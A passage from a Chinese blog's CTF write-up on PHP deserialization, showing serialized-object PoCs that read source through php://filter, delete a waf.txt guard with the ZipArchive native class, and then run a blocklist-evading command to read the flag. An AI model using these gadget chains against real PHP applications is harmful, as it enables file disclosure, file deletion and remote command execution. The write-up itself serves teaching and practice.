</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$poc</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Game</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$poc</span><span class="o">-&gt;</span><span class="na">username</span> <span class="o">=</span> <span class="s2">&#34;admin&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$poc</span><span class="o">-&gt;</span><span class="na">password</span> <span class="o">=</span> <span class="s2">&#34;admin&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$poc</span><span class="o">-&gt;</span><span class="na">register</span> <span class="o">=</span> <span class="s2">&#34;admin&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$poc</span><span class="o">-&gt;</span><span class="na">file</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Open</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$poc</span><span class="o">-&gt;</span><span class="na">filename</span> <span class="o">=</span> <span class="s2">&#34;php://filter/read=convert.base64-encode/resource=shell&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$poc</span><span class="o">-&gt;</span><span class="na">content</span> <span class="o">=</span> <span class="s2">&#34;xxx&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$poc</span><span class="p">));</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ‰§è¡ŒPOCç”Ÿæˆçš„payloadè¯»å–åˆ°shell.phpçš„æºç base64ç¼–ç </p>
<p>è§£ç å¾—åˆ°shell.phpæºç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">shell</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)</span><span class="o">&lt;</span><span class="mi">10</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/&#39;</span><span class="p">,</span><span class="nv">$cmd</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;NO&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">system</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;so long!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è”åˆindex.phpé‡Œé¢çš„Openç±»ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Open</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">open</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$content</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;waf.txt&#39;</span><span class="p">)){</span>    <span class="c1">// å½“waf.txtæ²¡è¯»å–æˆåŠŸæ—¶æ‰èƒ½å¾—åˆ°flag
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nx">shell</span><span class="p">(</span><span class="nv">$content</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="o">.</span><span class="s2">&#34;.php&#34;</span><span class="p">);</span>    <span class="c1">// filename=php://filter/read=convert.base64-encode/resource=shell
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ‰€ä»¥æˆ‘ä»¬åº”è¯¥è¦æƒ³åŠæ³•å°†waf.txtè¿™ä¸ªæ–‡ä»¶åˆ é™¤ï¼Œè¿™æ ·å°±ä¼šè¯»å–å¤±è´¥ï¼Œæ‰èƒ½æ‰§è¡Œæˆ‘ä»¬çš„å‘½ä»¤ã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨ZipArchiveåŸç”Ÿç±»è°ƒç”¨openæ–¹æ³•ï¼Œå³å¯å°†å³å¯å°†$filenameï¼ˆwaf.txtï¼‰åˆ é™¤</p>
<p>POC</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Game</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span>  <span class="nv">$username</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span>  <span class="nv">$password</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span>  <span class="nv">$choice</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span>  <span class="nv">$register</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span>  <span class="nv">$file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span>  <span class="nv">$filename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span>  <span class="nv">$content</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span><span class="o">=</span><span class="s1">&#39;user&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span><span class="o">=</span><span class="s1">&#39;user&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">register</span><span class="p">)</span><span class="o">===</span><span class="s2">&#34;21232f297a57a5a743894a0e4a801fc3&#34;</span><span class="p">){</span>    <span class="c1">// admin
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">choice</span><span class="o">=</span><span class="k">new</span> <span class="nx">login</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">choice</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">register</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">choice</span><span class="o">-&gt;</span><span class="na">checking</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">login</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$filename</span><span class="p">;</span>   
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$content</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Open</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">open</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$content</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$poc</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Game</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$poc</span><span class="o">-&gt;</span><span class="na">username</span> <span class="o">=</span> <span class="s2">&#34;admin&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$poc</span><span class="o">-&gt;</span><span class="na">password</span> <span class="o">=</span> <span class="s2">&#34;admin&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$poc</span><span class="o">-&gt;</span><span class="na">register</span> <span class="o">=</span> <span class="s2">&#34;admin&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$poc</span><span class="o">-&gt;</span><span class="na">file</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ZipArchive</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$poc</span><span class="o">-&gt;</span><span class="na">filename</span> <span class="o">=</span> <span class="s2">&#34;waf.txt&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$poc</span><span class="o">-&gt;</span><span class="na">content</span> <span class="o">=</span> <span class="nx">ZipArchive</span><span class="o">::</span><span class="na">OVERWRITE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$poc</span><span class="p">));</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ¥ä¸‹æ¥å°±å¯ä»¥ä½¿ç”¨ n\l /fla* æ‰§è¡Œå‘½ä»¤è¯»å–flagäº†</p>

</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/%E5%8E%9F%E7%94%9F%E7%B1%BB/">åŸç”Ÿç±»</a>
        
            <a href="/tags/xss/">XSS</a>
        
            <a href="/tags/ssrf/">SSRF</a>
        
            <a href="/tags/xxe/">XXE</a>
        
    </section>


    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under 9u_l3</span>
    </section>
    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">ç›¸å…³æ–‡ç« </h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="has-image">
    <a href="/p/apache%E7%9A%84.htaccess%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/">
        
        
            <div class="article-image">
                <img src="/p/apache%E7%9A%84.htaccess%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/1.52ca36c2a6fb59de206cf1a48d40bcbc.png" 
                        width="879" 
                        height="1111" 
                        loading="lazy"
                        alt="Featured image of post Apacheçš„.htaccessåˆ©ç”¨æŠ€å·§"
                        
                        data-hash="md5-Uso2wqb7Wd4gbPGkjUC8vA==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">Apacheçš„.htaccessåˆ©ç”¨æŠ€å·§</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
        
        
            <div class="article-image">
                <img src="/p/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.8ea5ddc7698c3ed325914647631edb2e.png" 
                        width="1024" 
                        height="1360" 
                        loading="lazy"
                        alt="Featured image of post Pharååºåˆ—åŒ–"
                        
                        data-hash="md5-jqXdx2mMPtMlkUZHYx7bLg==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">Pharååºåˆ—åŒ–</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/php-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
        
        
            <div class="article-image">
                <img src="/p/php-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1.39dc5aeb21fe84e00d19fefde26c2f93.jpg" 
                        width="6968" 
                        height="4913" 
                        loading="lazy"
                        alt="Featured image of post PHP sessionååºåˆ—åŒ–æ¼æ´"
                        
                        data-hash="md5-Odxa6yH&#43;hOANGf794mwvkw==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">PHP sessionååºåˆ—åŒ–æ¼æ´</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9E%84%E9%80%A0pop%E9%93%BE/">
        
        
            <div class="article-image">
                <img src="/p/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9E%84%E9%80%A0pop%E9%93%BE/1.8bd0a6075dc57c23c854b66a5832bf19.png" 
                        width="768" 
                        height="1280" 
                        loading="lazy"
                        alt="Featured image of post PHPååºåˆ—åŒ–æ„é€ POPé“¾"
                        
                        data-hash="md5-i9CmB13FfCPIVLZqWDK/GQ==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">PHPååºåˆ—åŒ–æ„é€ POPé“¾</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/php%E4%B8%8B%E7%9A%84sstitwig%E5%92%8Csmarty/">
        
        
            <div class="article-image">
                <img src="/p/php%E4%B8%8B%E7%9A%84sstitwig%E5%92%8Csmarty/1.33ee5f8b614a571b3178dd865ad744b1.png" 
                        width="2003" 
                        height="3072" 
                        loading="lazy"
                        alt="Featured image of post phpä¸‹çš„SSTI(twigå’Œsmarty)"
                        
                        data-hash="md5-M&#43;5fi2FKVxsxeN2GWtdEsQ==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">phpä¸‹çš„SSTI(twigå’Œsmarty)</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <script src='//unpkg.com/@waline/client@v2/dist/waline.js'></script>
<link href='//unpkg.com/@waline/client@v2/dist/waline.css' rel='stylesheet'/>
<div id="waline" class="waline-container"></div>
<style>
    .waline-container {
        background-color: var(--card-background);
        border-radius: var(--card-border-radius);
        box-shadow: var(--shadow-l1);
        padding: var(--card-padding);
        --waline-font-size: var(--article-font-size);
    }
    .waline-container .wl-count {
        color: var(--card-text-color-main);
    }
</style><script>
    
    Waline.init({"dark":"html[data-scheme=\"dark\"]","el":"#waline","emoji":["https://unpkg.com/@waline/emojis@1.0.1/weibo"],"locale":{"admin":"Admin","placeholder":null},"requiredMeta":["name","email","url"],"serverURL":"https://waline-test-one-smoky.vercel.app"});
</script>

    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
        2025 æ— æ•Œå¯çˆ±ç¾å’•å™œ
    </section>
    
    <section class="powerby">
        ä½¿ç”¨ <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> æ„å»º <br />
        ä¸»é¢˜ <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> ç”± <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> è®¾è®¡
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

<style>
  body {
    background: url(https://0d000721999.github.io/background/1.png) no-repeat center top;
    background-size: cover;
    background-attachment: fixed;
  }
</style>

 
<style>
  @font-face {
    font-family: 'ss';
    src: url(https://0d000721999.github.io/font/SeriousShannsNerdFontMono-Regular.otf) format('opentype');
  }

  :root {
    --base-font-family: 'ss';
    --code-font-family: 'ss';
  }
</style>
<style>
    #TableOfContents > ul, ol {
        ul, ol {
            display: none;
        }
        .open {
            display: block;
        }
    }
</style>

<script>
    function initTocHide() {
        
        let toc = document.querySelector(".widget--toc");
        if (!toc) {
            return;
        }
        
        window.addEventListener('scroll', function() {
            
            let openUl = document.querySelectorAll(".open");
            if (openUl.length > 0) {
              openUl.forEach((ul) => {
                ul.classList.remove("open")
              })
            }
            
            let currentLi = document.querySelector(".active-class");
            if (!currentLi) {
                return
            }
            
            if (currentLi.children.length > 1) {
                currentLi.children[1].classList.add("open")
            }
            
            let ul = currentLi.parentElement;
            do {
                ul.classList.add("open");
                ul = ul.parentElement.parentElement
            } while (ul !== undefined && (ul.localName === 'ul' || ul.localName === 'ol'))
        });
    }
    initTocHide()
</script>

<style>
    #backTopBtn {
        display: none;
        position: fixed;
        bottom: 30px;
        z-index: 99;
        cursor: pointer;
        width: 30px;
        height: 30px;
        background-image: url(https://0d000721999.github.io/icons/backTop.svg);
    }
</style>

<script>
    

    function initScrollTop() {
        let rightSideBar = document.querySelector(".right-sidebar");
        if (!rightSideBar) {
            return;
        }
        
        let btn = document.createElement("div");
        btn.id = "backTopBtn";
        btn.onclick = backToTop
        rightSideBar.appendChild(btn)
        
        window.onscroll = function() {
            
            if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
                btn.style.display = "block";
            } else {
                btn.style.display = "none";
            }
        };
    }

    

    function backToTop(){
        window.scrollTo({ top: 0, behavior: "smooth" })
    }

    initScrollTop();
</script>


<script>   
  const cdnPath = "https://cdn.jsdelivr.net/gh/0d000721999/live2d-test@f09405fd";
  const cssPath = "https://0d000721999.github.io/waifu/waifu.css"
  const config = {
    
    path: {
      homePath: "/",
      modelPath: cdnPath + "/Resources/",
      cssPath: cssPath,
      tipsJsonPath: cdnPath + "/waifu-tips.json",
      tipsJsPath: cdnPath + "/waifu-tips.js",
      live2dCorePath: cdnPath + "/Core/live2dcubismcore.js",
      live2dSdkPath: cdnPath + "/live2d-sdk.js"
    },
    
    tools: ["hitokoto", "asteroids", "express","photo", "quit"],
    
    drag: {
      enable: true,
      direction: ["x", "y"]
    },
    
    switchType: "order"
  }

  
  if (screen.width >= 768) {
    Promise.all([
      loadExternalResource(config.path.cssPath, "css"),
      loadExternalResource(config.path.live2dCorePath, "js"),
      loadExternalResource(config.path.live2dSdkPath, "js"),
      loadExternalResource(config.path.tipsJsPath, "js")
    ]).then(() => {
      initWidget({
        waifuPath: config.path.tipsJsonPath,
        cdnPath: config.path.modelPath,
        tools: config.tools,
        dragEnable: config.drag.enable,
        dragDirection: config.drag.direction,
        switchType: config.switchType
      });
    });
  }

  
  function loadExternalResource(url, type) {
    return new Promise((resolve, reject) => {
      let tag;
      if (type === "css") {
        tag = document.createElement("link");
        tag.rel = "stylesheet";
        tag.href = url;
      }
      else if (type === "js") {
        tag = document.createElement("script");
        tag.src = url;
      }
      if (tag) {
        tag.onload = () => resolve(url);
        tag.onerror = () => reject(url);
        document.head.appendChild(tag);
      }
    });
  }
</script>

    </body>
</html>
